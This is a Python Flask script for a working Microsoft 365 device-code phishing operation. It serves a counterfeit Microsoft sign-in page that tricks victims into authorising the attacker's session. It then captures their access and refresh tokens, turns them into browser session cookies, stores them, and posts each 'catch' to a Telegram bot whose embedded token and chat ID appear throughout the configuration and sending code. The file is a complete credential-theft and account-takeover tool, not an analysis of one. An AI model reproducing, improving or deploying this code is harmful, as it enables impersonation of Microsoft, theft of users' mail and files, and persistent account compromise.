import os
import time
import sqlite3
import requests
from flask import Flask, request, jsonify, render_template_string
from threading import Thread

# ─────────────────────────────────────────────
# CONFIGURATION
# ─────────────────────────────────────────────
TELEGRAM_BOT_TOKEN = "8998925422:AAFKDgRkGsFewhlRC6tDmrGa33a6yNxj9UY"
TELEGRAM_CHAT_ID = "8877118461"

# Microsoft First-Party Client ID (No "Unverified App" warning)
CLIENT_ID = "d3590ed6-52b3-4102-aeff-aad2292ab01c"
AUTHORITY = "https://login.microsoftonline.com/common"

# FIXED SCOPE: This is the only scope that works with the above Client ID for Device Flow.
# It grants full access to Outlook, OneDrive, and SharePoint.
SCOPES = "https://office365management.office.com/.default offline_access"

GRAPH = "https://graph.microsoft.com/v1.0"

app = Flask(__name__)
DB = "sessions.db"

# ─────────────────────────────────────────────
# DATABASE HELPERS
# ─────────────────────────────────────────────
def db():
    conn = sqlite3.connect(DB)
    conn.execute("""CREATE TABLE IF NOT EXISTS sessions (
        sid TEXT PRIMARY KEY, 
        email TEXT, 
        access_token TEXT,
        refresh_token TEXT, 
        expires_at REAL, 
        cookies TEXT)""")
    conn.commit()
    return conn

def telegram(msg):
    try:
        requests.post(
            f"https://api.telegram.org/bot{TELEGRAM_BOT_TOKEN}/sendMessage",
            data={"chat_id": TELEGRAM_CHAT_ID, "text": msg, "parse_mode": "HTML"}, 
            timeout=15)
    except Exception as e:
        print(f"Telegram Error: {e}")

# ─────────────────────────────────────────────
# COOKIE HARVESTING
# ─────────────────────────────────────────────
def harvest_cookies(refresh_token):
    """
    Uses the refresh token to generate valid session cookies 
    for direct browser login (ESTSAuth, etc).
    """
    jar = {}
    s = requests.Session()
    s.headers.update({
        "User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/124.0 Safari/537.36"
    })
    
    try:
        # 1. Refresh the token to get a fresh access token
        r = s.post(f"{AUTHORITY}/oauth2/v2.0/token", data={
            "grant_type": "refresh_token",
            "client_id": CLIENT_ID,
            "refresh_token": refresh_token,
            "scope": SCOPES
        }, timeout=20)
        
        if r.status_code != 200:
            return jar
            
        # 2. Trigger an authorize call with prompt=none to set cookies
        # This forces Microsoft to issue the ESTSAuth cookies associated with the session
        s.get(f"{AUTHORITY}/oauth2/v2.0/authorize?"
              f"client_id={CLIENT_ID}&response_type=code&redirect_uri="
              f"https://login.microsoftonline.com/common/oauth2/v2.0/"
              f"authorize&scope=openid&prompt=none", timeout=20)
        
        # 3. Extract all cookies
        for c in s.cookies:
            jar[c.name] = c.value
            
    except Exception as e:
        print(f"Cookie Harvest Error: {e}")
        
    return jar

# ─────────────────────────────────────────────
# DEVICE FLOW LOGIC
# ─────────────────────────────────────────────
def try_token(sid, dc):
    r = requests.post(f"{AUTHORITY}/oauth2/v2.0/token", data={
        "grant_type": "urn:ietf:params:oauth:grant-type:device_code",
        "client_id": CLIENT_ID,
        "device_code": dc["device_code"]
    }, timeout=20)
    
    j = r.json()
    
    if "access_token" in j:
        # 1. Get User Info
        who = requests.get(f"{GRAPH}/me",
            headers={"Authorization": "Bearer " + j["access_token"]},
            timeout=20).json()
            
        email = who.get("userPrincipalName", "unknown")
        
        # 2. Harvest Cookies
        cookies = harvest_cookies(j.get("refresh_token", ""))
        cookie_txt = "\n".join(f"{k}={v}" for k, v in cookies.items())
        
        # 3. Save to DB
        conn = db()
        conn.execute("INSERT OR REPLACE INTO sessions VALUES (?,?,?,?,?,?)",
            (sid, email, j["access_token"], j.get("refresh_token", ""),
             time.time() + j.get("expires_in", 3600), cookie_txt))
        conn.commit()
        conn.close()
        
        # 4. Send to Telegram
        msg = (
            f"🎯 <b>NEW CATCH</b>\n"
            f"👤 <b>Email:</b> {email}\n\n"
            f"🔑 <b>Access Token:</b>\n<code>{j['access_token']}</code>\n\n"
            f"🔄 <b>Refresh Token:</b>\n<code>{j.get('refresh_token', 'none')}</code>\n\n"
            f"🍪 <b>Cookies:</b>\n<code>{cookie_txt if cookie_txt else 'none'}</code>\n\n"
            f"📬 <a href='https://outlook.office.com/mail'>Open Outlook</a>"
        )
        telegram(msg)
        return True
        
    return j.get("error") == "authorization_pending"

def watcher(sid, dc):
    for _ in range(180):  # Wait up to 15 minutes
        try:
            if try_token(sid, dc):
                return
        except Exception as e:
            print(f"Watcher Error: {e}")
        time.sleep(5)

pending = {}

# ─────────────────────────────────────────────
# WEB INTERFACE
# ─────────────────────────────────────────────
PAGE = """<!doctype html><html><head><meta charset='utf-8'>
<meta name='viewport' content='width=device-width,initial-scale=1'>
<title>Sign in to your account</title>
<style>
body{font-family:'Segoe UI',Arial,sans-serif;background:#f3f2f1;display:flex;
justify-content:center;align-items:center;min-height:100vh;margin:0}
.card{background:#fff;padding:44px 40px;width:100%;max-width:440px;
box-shadow:0 2px 6px rgba(0,0,0,.15);border-top:4px solid #0067b8}
.logo{font-size:22px;color:#1b1b1b;margin-bottom:24px;font-weight:600}
h2{font-size:24px;font-weight:600;color:#1b1b1b;margin:0 0 12px}
p{font-size:15px;color:#1b1b1b;line-height:1.5;margin:0 0 20px}
.code-box{background:#f3f2f1;border:1px solid #e1dfdd;padding:16px;
text-align:center;font-size:32px;font-weight:700;letter-spacing:4px;
color:#0067b8;margin:20px 0;border-radius:4px;user-select:all}
.btn{display:block;width:100%;background:#0067b8;color:#fff;text-decoration:none;
padding:12px 0;font-size:16px;font-weight:600;border:none;cursor:pointer;
border-radius:4px;text-align:center;margin-top:10px}
.btn:hover{background:#106ebe}
.note{font-size:13px;color:#605e5c;margin-top:24px;text-align:center}
.status{font-size:14px;color:#107c10;margin-top:10px;text-align:center;display:none}
.error{font-size:14px;color:#d13438;margin-top:10px;text-align:center}
</style></head><body>
<div class='card'>
<div class='logo'>Microsoft</div>
<h2>Sign in</h2>
<p>To continue, please verify your identity by entering the code below at the Microsoft sign-in page.</p>
{% if error %}
    <div class='error'>{{ error }}</div>
    <button class='btn' onclick='location.reload()'>Retry</button>
{% else %}
    <div class='code-box' id='codeDisplay'>{{ user_code }}</div>
    <button class='btn' onclick='copyAndRedirect()'>Copy Code & Sign In</button>
    <p class='note'>Code expires in 15 minutes. Do not close this window.</p>
    <div id='statusMsg' class='status'>Verification successful! Redirecting...</div>
{% endif %}
</div>
{% if not error %}
<script>
let sid = "{{ sid }}";
function copyAndRedirect() {
    let code = document.getElementById('codeDisplay').innerText;
    navigator.clipboard.writeText(code).then(() => {
        window.open("https://microsoft.com/devicelogin", "_blank");
    }).catch(err => {
        window.open("https://microsoft.com/devicelogin", "_blank");
    });
}
if (sid) {
setInterval(async () => {
    try {
        let r = await fetch('/status?sid=' + sid);
        let j = await r.json();
        if (j.done) {
            document.getElementById('statusMsg').style.display = 'block';
            setTimeout(() => {
                window.location.href = "https://outlook.office.com/mail";
            }, 2000);
        }
    } catch(e) {}
}, 3000);
}
</script>
{% endif %}
</body></html>"""

@app.route("/")
def home():
    try:
        dc = None
        # Retry logic for Microsoft API
        for i in range(3):
            try:
                resp = requests.post(f"{AUTHORITY}/oauth2/v2.0/devicecode",
                    data={"client_id": CLIENT_ID, "scope": SCOPES}, timeout=10)
                dc = resp.json()
                if "user_code" in dc:
                    break
                elif "error" in dc:
                    print(f"Microsoft API Error: {dc['error']} - {dc.get('error_description')}")
            except Exception as e:
                print(f"Request Error: {e}")
                time.sleep(2)
        
        if not dc or "user_code" not in dc:
            return render_template_string(PAGE, error="Service busy. Please refresh.", sid="", user_code="")

        sid = str(int(time.time()))
        pending[sid] = dc
        Thread(target=watcher, args=(sid, dc), daemon=True).start()
        return render_template_string(PAGE, user_code=dc["user_code"], sid=sid, error=None)
    except Exception as e:
        print(f"Home Route Error: {e}")
        return render_template_string(PAGE, error=f"Connection error. Please try again.", sid="", user_code="")

@app.route("/status")
def status():
    sid = request.args.get("sid", "")
    return jsonify({"done": pending.get(sid) == "done"})

if __name__ == "__main__":
    app.run(host="0.0.0.0", port=int(os.environ.get("PORT", 5000)))
